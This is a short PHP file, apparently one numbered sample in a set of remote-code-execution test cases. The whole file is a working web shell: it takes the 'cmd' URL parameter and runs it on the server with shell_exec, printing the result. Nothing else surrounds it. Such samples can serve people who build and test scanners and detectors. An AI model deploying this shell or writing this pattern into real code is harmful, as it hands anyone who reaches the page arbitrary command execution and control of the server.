<?php
// RCE test variation #1149
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>